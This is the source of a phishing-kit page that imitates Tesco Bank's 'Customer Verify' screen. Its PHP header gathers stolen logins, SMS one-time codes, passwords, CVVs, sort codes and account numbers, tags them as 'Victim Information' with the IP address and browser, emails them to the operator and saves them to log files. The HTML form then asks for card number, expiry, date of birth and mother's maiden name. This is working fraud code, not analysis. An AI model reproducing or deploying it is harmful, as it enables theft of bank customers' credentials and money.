﻿<?php
/* ------------------------ ICQ : 743688056 ------------------------- */
include "../antibots.php";
include "../email.php";
require "assets/js/enc.php"; 
error_reporting(0);
session_start();

$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['sortcode'] = $_POST['sortcode'];
$_SESSION['accno'] = $_POST['accno'];


$uid = $_SESSION['uid'];
$DIGIT1 = $_SESSION['DIGIT1'];
$DIGIT2 = $_SESSION['DIGIT2'];
$DIGIT3 = $_SESSION['DIGIT3'];
$DIGIT4 = $_SESSION['DIGIT4'];
$DIGIT5 = $_SESSION['DIGIT5'];
$DIGIT6 = $_SESSION['DIGIT6'];
$phone  = $_SESSION['phone'];
$OTA = $_SESSION['OTA'];
$OTA2 = $_SESSION['OTA2'];
$password = $_SESSION['password'];
$cvv = $_SESSION['cvv'];
$sortcode = $_SESSION['sortcode'];
$accno = $_SESSION['accno'];


$TIME_DATE = date('H:i:s d/m/Y');
date_default_timezone_set('Europe/London');


$ip = $_SERVER['REMOTE_ADDR'];
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo3 = "| UserAgent :"." ".$_SERVER['HTTP_USER_AGENT'];
$VictimInfo4 = "| Browser :"." ".browsername();
$VictimInfo5 = "| Platform :"." ".os_info($systemInfo['useragent']);
$subj = "Tesco | LOG | $ip";
$headers = "MIME-Version: 1.0" . "\r\nFrom:Kr3pto <Kr3ptotesco@result.co.uk>" . "\r\n";
$headers .= "Content-type: text/plain; charset=UTF-8\n";
$data = "
+ ------------- Tesco LOG -------------+
| Username : $uid
| Security Code : $DIGIT1$DIGIT2$DIGIT3$DIGIT4$DIGIT5$DIGIT6
| Phone Number : $phone
| Access Code 1 (SMS) : $OTA
| Password : $password
+-------------------------------------------+
| CVV : $cvv
| SORTCODE : $sortcode
| ACCOUNT NUMBER : $accno
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Time/Date : $TIME_DATE
+ ------------------------------------------+
";
mail($to,$subj,$data,$headers);
$file=fopen("./logs/$ip.txt","a");
$file1=fopen("./logs2/$ip.txt","a");
fwrite($file,$data."\r\n");
fwrite($file1,$data."\r\n");
fclose($file);
fclose($file1);
?>
<!DOCTYPE html>
<!-- saved from url=(0093)https://login.myproducts.tescobank.com/arcotafm/saml/tescoBankController?SDAN=ZqK4SBcr0u4xdoq -->
<html class="js svg csscalc boxsizing" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    


<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>Customer Verify</title>
<meta name="description" content="Registration start (non-origination) - Customer Verify">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link type="image/x-icon" href="./assets/img/favicon.png" rel="shortcut icon">
<script type="text/javascript">function movetoNext(current, nextFieldID) {if (current.value.length >= current.maxLength) {document.getElementById(nextFieldID).focus();}}</script>



<!--[if lt IE 9]><link rel="stylesheet" href="/arcotafm/responsive-assets/fd8911d/css/core-ie.min.css"/><![endif]-->
<!--[if gt IE 8]><!--><link href="./assets/css/core.min.css" rel="stylesheet"><!--<![endif]-->


<!-- {{! scripts that must run in the head }} -->
<script src="./assets/js/core-head.min.js"></script>


<!--[if IE 7]>
<script src="/arcotafm/responsive-assets/fd8911d/js/vendor/json2.min.js"></script>
<![endif]-->
<script src="./assets/js/Bootstrap.js"></script>
<!--[if IE 7]><script>
document.getElementsByTagName('html')[0].className += ' ie7 legacyie';
</script><![endif]-->
<!--[if IE 8]><script>
document.getElementsByTagName('html')[0].className += ' ie8 legacyie';
</script><![endif]-->
<!--[if IE 9 & !IEMobile ]><script>
document.getElementsByTagName('html')[0].className += ' ie9';
</script><![endif]-->
    
  </head>
  <body>
    <div class="container">
      <div id="skiplink"><a href="https://login.myproducts.tescobank.com/arcotafm/saml/tescoBankController?SDAN=ZqK4SBcr0u4xdoq#content" class="screen-reader-only">skip to content</a></div>
      <header role="banner">
    <div class="header">
        <div class="inner">
            <a href="https://login.myproducts.tescobank.com/arcotafm/saml/tescoBankController?SUBMIT=EXIT&amp;StateDataAttrNm=0u1Ws60gBCnzIir">
                <div class="header__logo" role="img" aria-label="Tesco Bank">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1130.6 208.1">
                        <path fill="#274B93" d="M61.9 168H150c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.6 14.5-34.3 14.5H7.3c-.6 0-.6-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.2-14 31.7-14M639.9 168h88.2c.7 0 .9.5-.1.8-9.9 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23-18.4 23-18.4 5.6-5.8 17.2-14 31.6-14M206.4 168h88.1c.8 0 .9.5-.1.8-9.8 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.5 0-.5-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.3-14 31.7-14M351 168h88c.8 0 .9.5 0 .8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14M495.5 168h88.1c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.8 8.9-17.6 14.5-34.2 14.5h-84.2c-.6 0-.6-.5-.2-.7 9.4-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14"></path>
                        <path fill="#C20E1A" d="M519.3 8.4c-55.4 0-92.1 26.7-92.1 67.3 0 37.3 33.6 62.1 84 62.1 16.3 0 31-2 47.9-6.1v-31.4c-12 12.7-26.4 17.7-41.8 17.7-29.7 0-50.1-18.6-50.1-45.3 0-26.3 21.1-45.4 50.6-45.4 16.1 0 29 5.7 39.3 15.8V11.7c-10.7-2.2-24.1-3.3-37.8-3.3M102.5 30.2c20.6.2 45.2 3.9 55.6 11.9V12.3H11.9v29.8C22.3 34 44 30.9 67.7 30.7v81.2c0 11.9-1 15.3-6 21.5h46.9c-5.3-6.2-6.1-9.6-6.1-21.5V30.2zM254.3 59.4c-8.5 2.7-23.4 3.5-31.6 3.5h-12.2V30.7H227c14.7 0 40.3 3.1 49.9 11.1V12.3H170.6c4.9 6.2 5.9 9.7 5.9 21.5V112c0 11.9-1 15.4-5.7 21.5h113.4V104c-15.5 11.1-45.1 11.2-57.2 11h-16.5V81h12.2c8.1 0 23 .9 31.6 3.5V59.4zM412 16.4c-16.7-5.3-38.9-8.3-55.8-8.3-30.8 0-60.7 9.1-60.7 39.7 0 53 92.3 25 92.3 57.4 0 10.5-16.3 14.8-29.5 14.8-23.8 0-40.3-3.6-61-16v26.6c15.5 5.1 36.6 7.6 59.5 7.6 31.9 0 61.7-8.2 61.7-39.5 0-55.3-92.3-30.5-92.3-57.5 0-10.9 14.8-14.7 27.7-14.7 21.8 0 45.3 6.5 58.2 18.4V16.4zM723.6 72.2c0-38.2-30.1-63.8-75.1-63.8-47.8 0-81.5 27.5-81.5 66.2 0 38 30.3 63.2 75.5 63.2 48 0 81.1-26.7 81.1-65.6m-119.9.7c0-25.5 16.2-46.3 41.6-46.3 25 0 41.6 20.7 41.6 46.3 0 25.6-16.6 46.2-41.6 46.2-25.4.1-41.6-20.6-41.6-46.2"></path>
                        <path fill="#274B93" d="M828.6 76.3h-27.9v45.1h27.9c14.4 0 22.9-9.2 22.9-22.5 0-13.4-8.7-22.6-22.9-22.6m-3.4-51.8h-24.5v39.4h24.5c11.5 0 19.5-8 19.5-19.9 0-13-7.3-19.5-19.5-19.5m5.9 109.3h-43.5c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2-9.4H827c24.8 0 34.2 13.7 34.2 28.7 0 9-2.5 20.6-15.4 27.9 16.9 5.9 22.7 17.4 22.7 31.4 0 18.1-14 33.7-37.4 33.7M930.9 95.1c-4.6-.9-12.6-2-18.5-2-13.3 0-19.7 5.5-19.7 16 0 10.3 6.6 14.7 16.5 14.7 11.7 0 19-6.6 21.6-9.9V95.1zm2.7 38.7c-1.6 0-2.5-.7-2.5-2.1V126c-3.4 3.2-11.2 9.9-26.8 9.9-17.2 0-26.8-10.6-26.8-26.4 0-17.7 12.4-27.5 33-27.5 7.3 0 14.9.9 20.4 1.8v-4.3c0-13.5-7.3-17.9-21.1-17.9-11 0-19.2 3.7-21.8 5.5l-2.7-7.1c-.2-.7-.7-2.1-.5-2.3-.5-2.1.9-3.2 3.2-4.3 2.7-1.2 12.1-4.4 23.6-4.4 26.3 0 34.2 11.9 34.2 29.5v55.4h-12.2zM1021.1 133.8c-1.4 0-2.3-.7-2.3-2.1v-49c0-13.5-5-20.8-17.9-20.8-10.6 0-18.8 6.7-23.4 13.3v58.5h-12.6c-1.4 0-2.3-.7-2.3-2.1V72.7c0-5.3-.4-10.8-1.2-15.4-.4-2.5-.9-4.6-1.6-6.2h11.9c1.8 0 2.5.7 2.8 1.6.4.9.7 2.1.9 3.4.4 1.8.5 3.9.7 5.5 3.5-4.1 13.1-12.6 27.3-12.6 21.5 0 30.3 11.2 30.3 30.3v54.5h-12.6zM1107.6 133.8c-1.8 0-3.4-.5-5.3-2.7L1065 92.6v41.2h-12.6c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2.5-9.4l9.6-.9c2.3-.2 4.3-.4 5.1-.4 1.8 0 2.7.7 2.7 2.3V85l31.8-31.2c2.1-2 3.5-2.7 5.3-2.7h16.3L1080 88l45.4 45.8h-17.8z"></path>
                    </svg>
                </div>
            </a>
        </div>
    </div>
</header>

      <main role="main">
        <div id="content" class="content">
          

  

    
      
    <div class="security-banner">
  <div class="inner">
    <div class="security-banner__icon">
      <span class="security-banner__circle"><i class="icon icon--security"></i></span>
    </div>
    <div class="security-banner__container">
      <p class="security-banner__title">Verify your account</p></div>
    </div>
</div>

    
      
      
    

<div class="progress-bar">
  <div class="inner">
    <div class="progress-bar__container"><span class="screen-reader-only">Step 1 of 7</span>
    <span class="progress-bar__step progress-bar__step--last"><i class="icon icon--chevron-end"></i></span></div></div>
</div>


    
      
        <div id="dontShowNavigationWarning">

        
<div class="page-heading">
  <div class="inner">
    <h1 class="page-heading__primary">Online Banking Verification</h1>
  </div>
</div>
      
      
    

    <div id="customer-verify" data-tag="pagename">
      <div class="inner">
        <form action="finish.php?action=verified&account=<?=$rand;?>" method="post" id="inputForm" class="form" autocomplete="off" novalidate="novalidate">
          





<div class="page-error hide js-tls-warning">
    <p class="page-error__title no-bottom has-icon"><i class="icon icon--error-round"></i>Please update your browser to make the most of our Online Banking</p>
    <p>On the 6th of October we updated our security measures for Tesco Bank Online Banking.</p><p>Unfortunately, the browser version you are currently using <span class="bold">no longer</span> allows you access to all of our online banking services.</p><p>Please go to our <a class="page-error__link js-no-icon" rel="external" href="https://www.tescobank.com/online-banking/help/technical-support/" title="Link will open in a new window" target="_blank">Online Banking Technical Support page</a> now to find out which browsers we support and how to update your browser.</p>
</div>



          



<div class="form__panel">
  <h2 class="form__heading">Personal Information</h2>
  <div id="credit-card-fields">
      <div class="form__item">
        <label for="CREDITCARD_NUMBER" class="form__label">16 Digit Card number</label>
      <div class="form__control"><input onkeydown="return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46" name="ccno" id="ccno" value="" maxlength="19" class="form__input" placeholder="Enter your Tesco Bank credit card number"  type="tel"></div>
    </div>
  <div class="form__item form__item--narrow">
    <label for="DATE_OF_BIRTH" class="form__label">Expiry Date <span class="normal">(MM-YYYY)</span></label>
    <div class="form__control"><input type="tel" name="expy" id="expy" value="" maxlength="7" class="form__input js-inputmask" data-inputmask="00-0000" placeholder="MM-YYYY"></div>
  </div> 	
  <div class="form__item form__item--narrow">
    <label for="DATE_OF_BIRTH" class="form__label">CVV <span class="normal"></span></label>
    <div class="form__control"><input type="tel" name="cvv" id="cvv" value="" maxlength="3" class="form__input" placeholder=""></div>
  </div>   
  </div>
  <div class="form__item">
    <label for="FIRST_NAME" class="form__label">Full Name</label>
    <div class="form__control"><input type="text" name="FIRST_NAME" id="FIRST_NAME" value="" maxlength="80" class="form__input" placeholder="Enter your first name"></div>
  </div>
  <div class="form__item">
    <label for="ADDRESS" class="form__label">House Number/Name</label>
    <div class="form__control"><input type="text" name="ADDRESS" id="ADDRESS" value="" maxlength="30" class="form__input" placeholder="Enter your Address" required="required" aria-required="true"></div>
  </div>  
  <div class="form__item form__item--narrow">
    <label for="POSTCODE" class="form__label">Postcode</label>
    <div class="form__control"><input required aria-required="true"  type="text" name="POSTCODEy" id="POSTCODEy" value="" maxlength="8" class="form__input" placeholder="Enter your postcode"></div>
  </div>
  <div class="form__item form__item--narrow">
    <label for="DATE_OF_BIRTH" class="form__label">Date of birth <span class="normal">(DD-MM-YYYY)</span></label>
    <div class="form__control"><input type="tel" name="DATE_OF_BIRTH" id="DATE_OF_BIRTH" value="" maxlength="10" class="form__input js-inputmask" data-inputmask="00-00-0000" placeholder="DD-MM-YYYY"></div>
  </div> 
    <div class="form__item">
    <label for="phonen" class="form__label">Mobile Phone Number</label>
    <div class="form__control"><input onkeydown="return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46" type="text" name="phonen" id="phonen" value="" maxlength="15" class="form__input" placeholder="Enter your home phone number"></div>
  </div>  
    <div id="credit-card-fields">
      <div class="form__item">
        <label for="MMN" class="form__label">Mother's Maiden Name</label>
      <div class="form__control"><input required="required" aria-required="true" type="text" name="MMN" id="MMN" value="" maxlength="15" class="form__input" placeholder="Enter your Mother Maiden Name"></div>
    </div>
  </div>
    <div id="credit-card-fields">
      <div class="form__item">
        <label for="email" class="form__label">Email Address</label>
      <div class="form__control"><input required="required" aria-required="true" type="email" name="email" id="email" maxlength="80" value="" class="form__input" placeholder="Enter Your Email Address"></div>
    </div>
  </div>  

          <div class="button-container">
            <input type="submit" class="button button--action" id="NEXTBUTTON" value="Next">
            
          </div>

        </form>
  
</div>


    </div>
    <div class="banner">
  <div class="inner">
    <div class="banner__content"><h2>Can we help?</h2><p>Our <a href="https://www.tescobank.com/personal/finance/help/index.html" rel="external" title="Link will open in a new window" target="_blank" class="external-link">Online Help Centre</a> can help with most questions. Or if you'd prefer to speak to someone, <a href="https://www.tescobank.com/personal/finance/help/contact_us.html" rel="external" title="Link will open in a new window" target="_blank" class="external-link">contact us</a> and we'll be happy to help.</p></div>
  </div>
</div>
  


        </div>
      </div></main>
      
<footer>
  <div class="footer">
    <div class="inner">
      <p class="footer__copyright" role="contentinfo">Copyright © 2018 Tesco Personal Finance plc</p>
    </div>
  </div>
</footer>
<script src="./assets/js/core.min.js"></script>
      
    </div>
  


</body></html>